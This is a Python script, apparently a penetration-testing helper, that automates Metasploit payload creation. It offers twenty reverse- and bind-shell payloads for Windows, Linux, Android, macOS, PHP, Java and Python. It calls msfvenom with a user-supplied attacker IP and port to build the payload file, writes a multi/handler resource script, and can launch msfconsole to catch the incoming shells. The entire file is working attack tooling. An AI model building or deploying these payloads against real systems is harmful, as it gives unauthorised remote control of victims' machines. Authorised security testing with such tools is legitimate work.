import subprocess
import os

# 20+ Payload options (customizable)
PAYLOADS = {
    "1": ("windows/meterpreter/reverse_tcp", "exe"),
    "2": ("windows/meterpreter/reverse_http", "exe"),
    "3": ("windows/meterpreter/reverse_https", "exe"),
    "4": ("windows/shell/reverse_tcp", "exe"),
    "5": ("linux/x86/meterpreter/reverse_tcp", "elf"),
    "6": ("linux/x64/shell_reverse_tcp", "elf"),
    "7": ("linux/x86/shell_reverse_tcp", "elf"),
    "8": ("android/meterpreter/reverse_tcp", "apk"),
    "9": ("android/meterpreter/reverse_http", "apk"),
    "10": ("osx/x86/shell_reverse_tcp", "macho"),
    "11": ("osx/x64/meterpreter_reverse_tcp", "macho"),
    "12": ("php/meterpreter_reverse_tcp", "raw"),
    "13": ("java/meterpreter_reverse_tcp", "jar"),
    "14": ("python/meterpreter_reverse_tcp", "raw"),
    "15": ("windows/x64/meterpreter/reverse_tcp", "exe"),
    "16": ("windows/x64/shell/reverse_tcp", "exe"),
    "17": ("windows/meterpreter_bind_tcp", "exe"),
    "18": ("linux/x86/meterpreter_bind_tcp", "elf"),
    "19": ("windows/x64/meterpreter/reverse_http", "exe"),
    "20": ("windows/x64/meterpreter/reverse_https", "exe"),
}

def list_payloads():
    print("\n[+] Available Payloads:")
    for key, (payload, fmt) in PAYLOADS.items():
        print(f" {key}. {payload} [{fmt}]")

def get_user_config():
    list_payloads()
    choice = input("\n[?] Select payload number: ").strip()
    if choice not in PAYLOADS:
        print("[!] Invalid selection.")
        exit(1)

    payload, default_format = PAYLOADS[choice]
    lhost = input("[?] Enter LHOST (your IP): ").strip()
    lport = input("[?] Enter LPORT (your port): ").strip()
    fmt = input(f"[?] Format? (default: {default_format}): ").strip() or default_format
    out = input("[?] Output file name (e.g., payload.exe): ").strip()
    
    return {
        "payload": payload,
        "lhost": lhost,
        "lport": lport,
        "format": fmt,
        "output": out
    }

def generate_payload(config):
    print("\n[*] Generating payload with msfvenom...")
    cmd = [
        "msfvenom",
        "-p", config["payload"],
        f"LHOST={config['lhost']}",
        f"LPORT={config['lport']}",
        "-f", config["format"],
        "-o", config["output"]
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode == 0:
        print(f"[+] Payload saved as {config['output']}")
    else:
        print("[!] Error during payload generation:")
        print(result.stderr)

def generate_rc(config, rc_name="handler.rc"):
    print("[*] Creating Metasploit handler script...")
    content = f"""
use exploit/multi/handler
set payload {config['payload']}
set LHOST {config['lhost']}
set LPORT {config['lport']}
set ExitOnSession false
exploit -j
"""
    with open(rc_name, "w") as f:
        f.write(content.strip())
    print(f"[+] Handler RC file saved as {rc_name}")

def launch_msfconsole(rc_file="handler.rc"):
    print("\n[*] Launching msfconsole with handler...")
    subprocess.run(["msfconsole", "-r", rc_file])

if __name__ == "__main__":
    print("=== Ultimate MSF Payload Automator ===")
    config = get_user_config()
    generate_payload(config)
    generate_rc(config)
    
    launch = input("\n[?] Launch Metasploit handler now? (y/N): ").strip().lower()
    if launch == 'y':
        launch_msfconsole()
    else:
        print("[*] Exiting. You can run 'msfconsole -r handler.rc' manually.")

